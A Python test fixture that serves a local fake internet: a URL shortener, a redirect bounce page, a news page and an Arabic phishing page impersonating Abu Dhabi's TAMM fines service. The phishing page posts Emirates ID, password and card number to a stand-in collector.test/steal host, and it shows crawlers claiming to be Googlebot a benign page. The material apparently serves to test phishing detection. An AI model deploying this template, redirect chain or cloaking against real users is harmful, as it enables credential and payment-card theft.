"""A tiny fake internet for tests: a shortener, a cloaked TAMM phishing page, a bounce page and a news article."""
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PHISH = """<html><head><title>تم | دفع المخالفات المرورية - TAMM</title></head><body>
<img src="https://www.tamm.abudhabi/assets/logo.png"><h1>تم TAMM</h1><p>لديك مخالفة مرورية غير مدفوعة. ادفع الآن لتجنب الغرامة.</p>
<form action="http://collector.test/steal" method="post"><input name="emirates_id" placeholder="رقم الهوية">
<input type="password" name="password"><input name="card" placeholder="رقم البطاقة"><button>ادفع</button></form>
<p>للاستفسار اتصل على 0551234567</p></body></html>"""
BENIGN = "<html><head><title>Welcome</title></head><body><p>Under construction.</p></body></html>"
NEWS = "<html><head><title>How to pay fines with TAMM</title></head><body><p>A guide to TAMM and UAE PASS.</p></body></html>"


class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, body="", headers=None):
        self.send_response(code)
        for k, v in (headers or {}).items():
            self.send_header(k, v)
        b = body.encode()
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        host = (self.headers.get("Host") or "").split(":")[0]
        port = self.server.server_address[1]
        bot = "Googlebot" in (self.headers.get("User-Agent") or "")
        if host == "short.test":
            self._send(301, "", {"Location": f"http://bounce.test:{port}/go"})
        elif host == "bounce.test":
            self._send(200, f'<meta http-equiv="refresh" content="0;url=http://tamm-fines.test:{port}/login">')
        elif host == "tamm-fines.test":
            self._send(200, BENIGN if bot else PHISH)
        elif host == "news.test":
            self._send(200, NEWS)
        else:
            self._send(404, "nf")


def start():
    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]
